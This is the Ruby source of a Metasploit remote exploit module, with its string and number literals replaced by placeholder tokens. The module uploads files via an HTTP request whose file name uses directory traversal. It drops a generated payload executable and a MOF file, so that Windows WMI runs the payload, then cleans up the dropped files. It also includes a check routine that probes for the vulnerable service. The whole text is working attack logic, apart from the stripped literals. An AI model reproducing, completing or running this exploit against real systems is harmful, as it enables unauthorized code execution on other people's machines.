require <str> class Metasploit3 < Msf :: Exploit :: Remote Rank = ExcellentRanking include Msf :: Exploit :: Remote :: HttpClient include Msf :: Exploit :: EXE include Msf :: Exploit :: WbemExec include Msf :: Exploit :: FileDropper def initialize ( info = { } ) super ( update_info ( info , <str> = > <str> , <str> = > <str> , <str> = > MSF_LICENSE , <str> = > [ <str> , <str> ] , <str> = > [ [ <str> , <str> ] , [ <str> , <str> ] , [ <str> , <str> ] , [ <str> , <str> ] ] , <str> = > { <str> = > <int> } , <str> = > { <str> = > true , <str> = > <int> } , <str> = > <str> , <str> = > ARCH_X86 , <str> = > [ [ <str> , { } ] ] , <str> = > <int> , <str> = > <str> ) ) register_options ( [ Opt :: RPORT ( <int> ) , OptInt . new ( <str> , [ true , <str> , <int> ] ) ] , self . class ) end def upload ( file_name , contents ) post_data = Rex :: MIME :: Message . new post_data . add_part ( rand_text_alpha ( <int> + rand ( <int> ) ) , nil , nil , <str> ) post_data . add_part ( contents , <str> , <str> , <str> file_name <str> ) data = post_data . to_s res = send_request_cgi ( { <str> = > <str> , <str> = > <str> , <str> = > <str> post_data . bound <str> , <str> = > data } ) res end def traversal <str> * datastore [ <str> ] end def exploit print_status ( <str> ) mof_name = <str> rand_text_alpha ( rand ( <int> ) + <int> ) <str> exe_name = <str> rand_text_alpha ( rand ( <int> ) + <int> ) <str> exe_content = generate_payload_exe mof_content = generate_mof ( mof_name , exe_name ) print_status ( <str> exe_name <str> ) exe_traversal = <str> traversal <str> exe_name <str> res = upload ( exe_traversal , exe_content ) unless res && res . code == <int> && res . body . blank? print_error ( <str> ) end register_file_for_cleanup ( exe_name ) print_status ( <str> mof_name <str> ) mof_traversal = <str> traversal <str> mof_name <str> upload ( mof_traversal , mof_content ) register_file_for_cleanup ( <str> mof_name <str> ) end def check res = send_request_cgi ( { <str> = > <str> , <str> = > <str> , <str> = > { <str> = > <str> , <str> = > <str> , <str> = > <str> } } ) if res && res . code == <int> if res . body . to_s . include? ( <str> ) return Exploit :: CheckCode :: Detected elsif res . body . to_s . include? ( <str> ) return Exploit :: CheckCode :: Safe end end Exploit :: CheckCode :: Unknown end end 
